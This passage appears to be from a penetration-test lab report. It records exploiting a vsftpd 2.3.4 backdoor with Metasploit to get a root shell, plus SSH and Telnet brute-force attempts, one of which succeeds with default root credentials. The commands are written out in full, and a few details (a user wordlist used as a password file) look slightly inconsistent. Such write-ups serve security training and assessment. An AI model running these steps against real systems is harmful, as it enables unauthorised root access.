## Phase 3: Initial Exploitation

### Step 1: Primary Exploit – vsftpd Backdoor

During the vulnerability assessment phase, the FTP service was identified as **vsftpd v2.3.4**, a version known to contain a malicious backdoor. This step focuses on exploiting that vulnerability to obtain remote shell access.

#### Module Discovery

The Metasploit framework was queried to locate the appropriate exploit module:

```bash
search vsftpd
```

**Expected Output:**

```
exploit/unix/ftp/vsftpd_234_backdoor
```

#### Exploit Configuration and Execution

The backdoor exploit module was configured and executed as follows:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 10.128.0.226
set PAYLOAD cmd/unix/interact
show options
run
```

**Expected Result:**

A command shell session is opened on the target system via the backdoor listener.

#### Post-Exploitation Verification

Once the shell session was established, basic commands were executed to verify access level and system context:

```bash
whoami
uname -a
ls /
```

**Observed Result:**

- Shell access was obtained as the `root` user  
- Target system identified as Debian GNU/Linux 11  
- Full filesystem access confirmed  

This confirmed successful exploitation with maximum privileges.

### Step 2: Alternative Exploitation Methods

In addition to the primary FTP-based exploit, alternative access vectors were tested to evaluate the overall attack surface.

---

### Step 2.1: SSH Brute Force Attack

An SSH brute-force attempt was conducted to determine whether weak or reused credentials were present.

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.128.0.226
set USERNAME root
set PASS_FILE /opt/metasploit-framework/embedded/framework/data/wordlists/unix_users.txt
run
```

A secondary attempt was performed using commonly known weak credentials:

```bash
set USERNAME user
set PASSWORD user
run
```

**Result:**

No successful SSH authentication was achieved using brute-force techniques. This indicated that SSH authentication was relatively hardened compared to other exposed services.

### Step 2.2: Telnet Brute Force Attack

Due to the presence of an exposed Telnet service, a brute-force login attempt was performed using known weak credentials.

```bash
use auxiliary/scanner/telnet/telnet_login
set RHOSTS 10.128.0.226
set USERNAME root
set PASSWORD toor
run
```

**Result:**

- Authentication succeeded using default credentials  
- A Telnet shell session was opened as `root`  

This confirmed that Telnet represented a critical secondary attack vector.

### Exploitation Summary

The exploitation phase demonstrated that the target system was critically vulnerable due to:

- An intentionally backdoored FTP service (vsftpd 2.3.4)
- The presence of insecure legacy services (Telnet)
- Weak credential management on exposed remote access services

These findings validate the effectiveness of service version enumeration and highlight the risks of outdated and misconfigured network services.
